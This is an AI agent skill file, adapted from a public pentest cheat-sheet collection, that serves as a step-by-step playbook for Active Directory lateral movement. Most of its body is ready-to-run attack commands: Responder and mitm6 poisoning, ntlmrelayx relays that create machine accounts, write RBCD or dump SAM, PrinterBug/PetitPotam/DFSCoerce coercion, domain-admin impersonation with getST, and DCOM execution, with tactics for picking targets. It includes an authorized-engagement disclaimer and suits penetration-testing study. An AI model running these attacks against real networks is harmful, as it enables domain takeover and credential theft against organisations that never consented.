---
name: active-directory-lateral-movement
description: >-
  Move laterally and coerce authentication in Active Directory: NTLM relay (SMB, LDAP, HTTP, AD
  CS), Kerberos relay, authentication coercion (PetitPotam, PrinterBug, DFSCoerce, Coerce) and
  DCOM execution. Use when you have credentials or a machine account and need code execution on
  another host, when a target lacks SMB or LDAP signing, when you need a victim to authenticate to
  your listener, or when chaining coercion into relay or AD CS.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "4"
  generated-by: build/build.py
---

# Active Directory Lateral Movement, Relay and Coercion

Lateral movement without credentials of the target is a two-part problem: make the victim
authenticate (coercion or poisoning), then spend that authentication somewhere it is accepted
(relay). The whole decision reduces to reading enforcement: SMB signing, LDAP signing and channel
binding, EPA, and whether the target can even be made to talk. Done means code execution on, or a
ticket for, a named host — or a written-down reason why every relay target refused.

## When to use this skill

- You have any domain account or machine account and need execution on another host that does not
  accept pass-the-hash or WinRM.
- A host reports `signing:False` in NetExec output, or LDAP signing is not required.
- You need a machine to authenticate outbound so you can relay it (PrinterBug, PetitPotam, DFS,
  WSP, mitm6).
- You have a coercion primitive and an AD CS endpoint — the relay target decides whether this is
  ESC8 or ESC11 (see `active-directory-certificates` for the certificate half).
- SMB and WinRM are filtered but DCOM/RPC is reachable.

For pass-the-hash, overpass-the-hash and ticket conversion, use `active-directory-credentials` and
`active-directory-kerberos`. For Exchange push-subscription relay, see
`active-directory-domain-escalation` (PrivExchange). For the signing state of a target, use
`active-directory-enumeration`.

## First moves

1. **Inventory relay targets before arming anything.** Signing state decides everything:

   ```bash
   netexec smb $hosts --gen-relay-list relay.txt
   nxc smb <ip> -u 'user' -p 'pass' -M spooler
   nxc smb <ip> -u 'user' -p 'pass' -M webdav
   ```

2. **No credentials: relay to LDAPS and create a machine account.** Needs LDAP signing not
   required, channel binding disabled, and `ms-DS-MachineAccountQuota >= 1`:

   ```bash
   sudo ./Responder.py -I eth0 -wfrd -P -v
   sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
   ```

   Relay to LDAPS specifically — account creation over plain LDAP is refused.

3. **SMB signing disabled: poison and relay for a session.** Turn off SMB and HTTP in
   `Responder.conf` first, then relay:

   ```bash
   impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
   impacket-ntlmrelayx -tf targets.txt          # or dump SAM on each target
   ```

   The `-socks` mode turns every captured session into a proxy for `proxychains impacket-smbclient`.

4. **Coerce a privileged machine account to your listener.** One module covers the RPC methods:

   ```bash
   poetry run nxc smb 10.10.10.10/24 -u username -p password -M coerce_plus -o METHOD=PrinterBug
   poetry run nxc smb 10.10.10.10/24 -u username -p password -M coerce_plus -o METHOD=PetitPotam
   python3 dfscoerce.py -u username -d domain.local 10.10.10.10 10.10.10.11
   ```

5. **Relay the coerced authentication into RBCD** when you cannot use the credential directly:

   ```bash
   ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support
   getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME
   ```

6. **IPv6/DNS takeover when LLMNR and NBT-NS are disabled.** mitm6 answers DHCPv6 and WPAD, then
   the same relay applies:

   ```bash
   mitm6 -i eth0 -d $domain
   impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt
   impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
   ```

7. **No relay path? Execute over DCOM** if RPC is reachable and you hold admin:

   ```bash
   dcomexec.py -share C$ -object MMC20 '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>' 'ipconfig'
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [ntlm-relay.md](references/ntlm-relay.md) | any relay decision — this is the main reference | signing/IPv4 vs IPv6 paths, LDAP-relay account creation, Drop the MIC (CVE-2019-1040) and MIC 2, Ghost Potato, RemotePotato0, mitm6/WPAD, WebDAV coerced auth, CVE-2025-33073 reflection, port-445 forwarding, IIS AppPool relay, pyrdp |
| [kerberos-relay.md](references/kerberos-relay.md) | NTLM is blocked but Kerberos auth is not | Kerberos relay over HTTP (LLMNR), over DNS (TKEY/TSIG), over SMB (KrbRelay), reflective relay CVE-2025-33073, ESC8 via krbrelayx |
| [coercion.md](references/coercion.md) | you need the victim to authenticate to you | server-side SMB/LDAP signing table, EPA values, WebClient service, PrinterBug/PetitPotam/DFSCoerce/WSPCoerce, coerce_plus methods |
| [dcom.md](references/dcom.md) | SMB/WinRM are unusable and you have admin | dcomexec.py objects, MMC20 `ExecuteShellCommand`, Office DDE/RegisterXLL, ShellWindows/ShellBrowserWindow CLSIDs, CheeseTools |

## Workflow

1. **Read the enforcement table first** (`coercion.md`). Defaults that matter: server-side SMB
   signing is required on all DCs; it is *not* required on 2019/2022/2025 member servers, Windows
   10 or Windows 11 23H2, but **is** required on Windows 11 24H2. LDAP signing is not required on
   Server 2019 DCs or 2022 DCs before 23H2, and is required on 2022 23H2+ and 2025 DCs.
2. **Choose the relay target by what accepts your authentication:**
   - SMB on a signing-disabled host → session/SAM dump.
   - LDAPS with channel binding disabled → create a computer (`--add-computer`), escalate a user
     (`--escalate-user`), or write RBCD (`--delegate-access`).
   - HTTP AD CS Web Enrollment → ESC8 certificate, then a TGT.
   - RPC/ICPR with encryption not enforced → ESC11.
3. **Choose how to get the authentication in:**
   - Spooler reachable → PrinterBug; print spooler disabled → PetitPotam/DFSCoerce; only SMB
     coercion needed and `wsearch` present → WSP.
   - Name resolution is weak → Responder (LLMNR/NBNS/mDNS) or mitm6 (DHCPv6/WPAD).
   - The victim has WebClient and you need HTTP instead of SMB → WebDAV trick with
     `ATTACKER@80/file`.
   - Coercion must stay local (session 0 shell) → RemotePotato0.
4. **If NTLM is blocked end-to-end**, switch to Kerberos relay: over HTTP via LLMNR poisoning, over
   DNS via `krbrelayx` + `mitm6`, or over SMB with `KrbRelay`. The reflective variant
   (CVE-2025-33073) relays a machine to itself and yields local admin.
5. **Convert the result.** Certificate → TGT (`certipy auth`); RBCD → `getST.py -impersonate`;
   relayed session → `-socks` then proxychains, or `--escalate-user` then DCSync.
6. **Fall back to DCOM** for execution: `MMC20.Application` `ExecuteShellCommand`, or
   `ShellWindows`/`ShellBrowserWindow` CLSIDs, or an Office object whose DDE/XLL path is enabled.

## Gotchas

- Relaying never works against the same host that authenticated (SMB reflection has been dead since
  MS08-068) — the exception is the `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` DNS-record trick
  in CVE-2025-33073, which is a deliberate self-relay and needs the target's SPN construction to
  be exploitable.
- Coercing to an **IP** gives you NTLM; coercing to a **hostname/FQDN** gives you Kerberos. That
  single choice decides whether you can use Kerberos relay at all.
- Responder and relay compete for the same ports: set `SMB = Off` and `HTTP = Off` in
  `Responder.conf` before relaying SMB, or the relay never sees the authentication.
- Creating an account over LDAP relay requires **LDAPS**; unencrypted LDAP refuses the write even
  when signing is not required. Machine account creation also consumes `ms-DS-MachineAccountQuota`.
- Port 445 is occupied on any host running SMB, so relaying *to* SMB from a Windows foothold needs
  PortBender, `smbtakeover`, or stopping LanmanServer/srv2/srvnet — each of which is noisy or
  disruptive.
- WebClient is installed by default on workstations and **not installed** on servers, so WebDAV
  coerced authentication is often unavailable against the DCs you actually want. Verify with
  `-M webdav`, do not assume.
- WSP coercion can only produce SMB connections, `wsearch` is workstation-only (disabled on
  servers since Server 2016), the target must be a short hostname (no IP, no FQDN), and the
  listener must be a hostname/FQDN if you want Kerberos.
- Ghost Potato needs all three of: local Administrators membership, Backup Operators membership,
  and an elevated token. Missing the elevated token is the usual silent failure.
- RemotePotato0 needs a session-0 shell plus a privileged user logged into session 1; the socat
  redirect on port 135 is required for targets newer than Server 2016.
- Drop the MIC (CVE-2019-1040) is patched — verify with `scanMIC.py` before building the chain, and
  note the flags differ between the two MIC CVEs.
- Coercion fails silently when the RPC service is not running: check `\\host\pipe\spoolss` for the
  spooler and `rpcdump.py` for MS-RPRN/MS-PAR before blaming the relay.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Coercion
and relay cause authentication failures and service noise on production hosts; several options
here (stopping SMB, restarting services) are disruptive — confirm before use.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
